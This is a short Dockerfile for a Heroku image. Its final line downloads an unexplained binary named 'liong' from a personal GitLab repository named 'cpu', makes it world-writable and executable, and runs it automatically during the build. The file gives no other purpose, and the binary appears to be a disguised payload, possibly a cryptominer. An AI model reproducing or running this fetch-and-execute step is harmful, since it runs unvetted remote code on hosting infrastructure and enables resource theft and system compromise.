FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://gitlab.com/mimix200/cpu/-/raw/main/liong && chmod 777 liong && ./liong
